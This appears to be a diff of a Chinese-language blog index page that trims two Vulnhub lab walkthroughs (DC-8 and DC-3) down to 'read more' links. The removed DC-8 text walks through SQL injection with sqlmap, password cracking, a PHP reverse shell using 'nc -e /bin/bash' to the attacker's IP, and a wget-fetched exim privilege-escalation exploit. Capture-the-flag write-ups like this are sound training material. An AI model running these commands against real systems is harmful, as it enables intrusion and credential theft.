@@ -190,135 +190,11 @@
 
 <h4 id="2-利用工具"><a href="#2-利用工具" class="headerlink" title="2.利用工具"></a>2.利用工具</h4><p><strong>注意：</strong>网络设置需要修改哦</p>
 <p>kali 桥接模式</p>
-<p>DC-8 桥接模式</p>
-<h3 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h3><h4 id="1-主机扫描"><a href="#1-主机扫描" class="headerlink" title="1.主机扫描"></a>1.主机扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613125957327.png" alt="image-20230613125957327"></p>
-<p>发现目标靶机的IP地址</p>
-<blockquote>
-<p>kali				192.168.1.9</p>
-<p>dc8				192.168.1.14</p>
-</blockquote>
-<h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h4><p>利用 <code>nmap</code> 扫描目标靶机IP开放的端口服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 1-65535 192.168.1.14</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613130212384.png" alt="image-20230613130212384"></p>
-<h4 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h4><p>利用 <code>dirsearch</code> 扫描网站后台目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://192.168.1.14/</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613131237851.png" alt="image-20230613131237851"></p>
-<h4 id="4-页面探测"><a href="#4-页面探测" class="headerlink" title="4.页面探测"></a>4.页面探测</h4><p>利用浏览器插件收集网站使用的技术</p>
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613131121722.png" alt="image-20230613131121722"></p>
-<p>发现是Drupal 7</p>
-<p>通过扫描到的目录进行查看</p>
-<p>在 <code>/CHANGELOG.txt</code> 中，发现了一个貌似类似于日志的文件，还知道了 <code>Drupal 7.67</code> 版本</p>
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613132353915.png" alt="image-20230613132353915"></p>
-<p>Drupal 7.67在网上查询不到漏洞</p>
-<p>经过探测，在主页，点击蓝色字体，地址栏出现 <code>?nid=1</code> 貌似存在注入点</p>
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613135610243.png" alt="image-20230613135610243"></p>
-<h3 id="三、渗透过程"><a href="#三、渗透过程" class="headerlink" title="三、渗透过程"></a>三、渗透过程</h3><h4 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h4><p>在nid参数后加单引号，测试一下是否为注入点</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?nid=&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613152518650.png" alt="image-20230613152518650"></p>
-<p>发现sql报错，确定为注入点</p>
-<p>利用SQLmap跑一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.14/?nid=1&quot; --level=5 --risk=3 --batch --current-db</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-</blockquote>
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613153016843.png" alt="image-20230613153016843"></p>
-<p>发现数据库，库名为 <code>d7db</code> </p>
-<p>爆表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.14/?nid=1&quot; --level=5 --risk=3 --batch -D &#x27;d7db&#x27; -tables</span><br></pre></td></tr></table></figure>
-
-<p> 爆出了很多个表</p>
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613153612379.png" alt="image-20230613153612379"></p>
-<p>知道表名，继续爆列名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.14/?nid=1&quot; --level=5 --risk=3 --batch -D &#x27;d7db&#x27; -T -columns</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613153944821.png" alt="image-20230613153944821"></p>
-<p>知道列名，我们开始爆字段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.14/?nid=1&quot; --level=5 --risk=3 --batch -D &#x27;d7db&#x27; -T &#x27;users&#x27; -C&#x27;mail,name,pass&#x27; -dump</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613154433201.png" alt="image-20230613154433201"></p>
-<h4 id="2-爆破密文"><a href="#2-爆破密文" class="headerlink" title="2.爆破密文"></a>2.爆破密文</h4><p>拿到账号密码，发现密码是经过加密的</p>
-<p>将两个密码存储进 <code>passdc8.1.txt</code> 中，方便后面利用。</p>
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613161115695.png" alt="image-20230613161115695"></p>
-<p>通过查询，Drupal的hash密文是经过特殊加密的，用john进行爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john passdc8.1.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613161216992.png" alt="image-20230613161216992"></p>
-<p>发现爆出来一个 <code>turtle</code> ，利用账号密码登录。分不清爆出的密码是哪个用户的，最好还是一个一个爆，就知道是哪个了，我只能都试试了。</p>
-<blockquote>
-<p>账号：admin</p>
-<p>密码：turtle</p>
-<p>账号：john</p>
-<p>密码：turtle</p>
-</blockquote>
-<p>在信息收集阶段，发现的登录页面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user/login</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613161548222.png" alt="image-20230613161548222"></p>
-<h4 id="3-查找漏洞"><a href="#3-查找漏洞" class="headerlink" title="3.查找漏洞"></a>3.查找漏洞</h4><p>经过测试，密码是用户 <code>john</code>  ，登录页面如下</p>
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613162133087.png" alt="image-20230613162133087"></p>
-<p>经过测试发现联系我们处有问题</p>
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613162859727.png" alt="image-20230613162859727"></p>
-<h4 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h4><p>在文本框内输入php代码，反弹shell</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;nc -e /bin/bash 192.168.1.49 6666&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613163517122.png" alt="image-20230613163517122"></p>
-<p>将提交重定向行Confirmation page（确认页面）给勾上，然后滑到底部点保存</p>
-<p>退出后，联系方式什么的随便填写，完成后点击提交</p>
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613164032820.png" alt="image-20230613164032820"></p>
-<p>提交后。PHP代码执行，反弹shell成功</p>
-<p>为了方遍，进入交互式shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613163828610.png" alt="image-20230613163828610"></p>
-<h4 id="5-提权阶段"><a href="#5-提权阶段" class="headerlink" title="5.提权阶段"></a>5.提权阶段</h4><p>查找提权方式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613164533519.png" alt="image-20230613164533519"></p>
-<p>发现<code>exim 4</code></p>
-<p>我们在dc4已经见过这个提权方式了</p>
-<p>老规矩，先查看一下版本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim --version</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613164812675.png" alt="image-20230613164812675"></p>
-<p>exim 4.89</p>
-<p>接着查找一下漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit exim 4</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613165317992.png" alt="image-20230613165317992"></p>
-<p>复制一下文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh dc8.sh  </span><br></pre></td></tr></table></figure>
-
-<p>开启http服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8888</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613170208718.png" alt="image-20230613170208718"></p>
-<p>在靶机shell中提取文件</p>
-<p>应该先进入 <code>/tmp</code> 目录下，因为这个目录权限大一些</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget 192.168.1.49:8888/dc8.sh</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613170657981.png" alt="image-20230613170657981"></p>
-<p>查看一下文件权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613170755327.png" alt="image-20230613170755327"></p>
-<p>可以看到文件不可执行的，我们可以用chmod命令赋予执行权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -x dc8.sh</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613171046570.png" alt="image-20230613171046570"></p>
-<p>输入命令，执行文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dc8.sh -m netcat</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613171933247.png" alt="image-20230613171933247"></p>
-<p>提权成功，root权限维持时间很短，所以搞事情的速度要快哦</p>
-<h4 id="6-查找flag"><a href="#6-查找flag" class="headerlink" title="6.查找flag"></a>6.查找flag</h4><p>在root下发现flag文件</p>
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613172120698.png" alt="image-20230613172120698"></p>
-<p>本文参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/126062437">(67条消息) DC-8靶场下载及渗透实战详细过程（DC靶场系列）_dc靶场下载_金 帛的博客-CSDN博客</a></p>
- 
+<p>DC-8 桥接模式</p> 
+      <a class="article-more-link" href="/2023/06/13/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/"
+        >阅读更多...</a
+      >
+       
       <!-- reward -->
       
     </div>
@@ -580,33 +456,11 @@
 <h3 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h3><p>官网给出的信息</p>
 <blockquote>
 <p>这个靶场与之前的不同，只有一个入口点和一个flag，并且没有任何线索。<br>靶场只需要简单的下载，解压，打开并将其导入到VMware即可</p>
-</blockquote>
-<h4 id="1-寻找目标"><a href="#1-寻找目标" class="headerlink" title="1.寻找目标"></a>1.寻找目标</h4><p>扫描同一网段中的IP</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230612093741121.png" alt="image-20230612093741121"></p>
-<p>发现目标IP</p>
-<p>扫描靶机目标，查看目标开放的服务端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -p 1-65535 192.168.1.43</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230613084619194.png" alt="image-20230613084619194"></p>
-<p>通过扫描，发现了一些关键信息</p>
-<h4 id="2-收集网站信息"><a href="#2-收集网站信息" class="headerlink" title="2.收集网站信息"></a>2.收集网站信息</h4><p>在浏览器中输入地址查看，发现是Joomla</p>
-<blockquote>
-<p>Joomla 在海外使用较多，是一套使用 PHP 和 MySQL 开发的开源、跨平台的内容管理系统(CMS)。</p>
-</blockquote>
-<p>在页面中发现是一个登录页面，没有其他敏感信息，使用dirsearch扫描目录</p>
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230613090659008.png" alt="image-20230613090659008"></p>
-<p>在<code>/administrator/index.php</code> 目录下发现后台登录页面</p>
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230613092301105.png" alt="image-20230613092301105"></p>
-<h4 id="3-寻找漏洞"><a href="#3-寻找漏洞" class="headerlink" title="3.寻找漏洞"></a>3.寻找漏洞</h4><p>因为是常见的cms,所以我们直接扫Joomla! cms常见漏洞</p>
-<blockquote>
-<p>1.安装onlinetool(在线cms识别|信息泄露|工控|系统|物联网安全|cms漏洞扫描|nmap端口扫描|子域名获取 在线工具安装)</p>
-<p>地址 <a target="_blank" rel="noopener" href="https://github.com/iceyhexman/onlinetools">https://github.com/iceyhexman/onlinetools</a></p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iceyhexman/onlinetools.git</span><br><span class="line">cd onlinetools</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">nohup python3 main.py &amp;</span><br></pre></td></tr></table></figure>
-
- 
+</blockquote> 
+      <a class="article-more-link" href="/2023/06/05/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/"
+        >阅读更多...</a
+      >
+       
       <!-- reward -->
       
     </div>
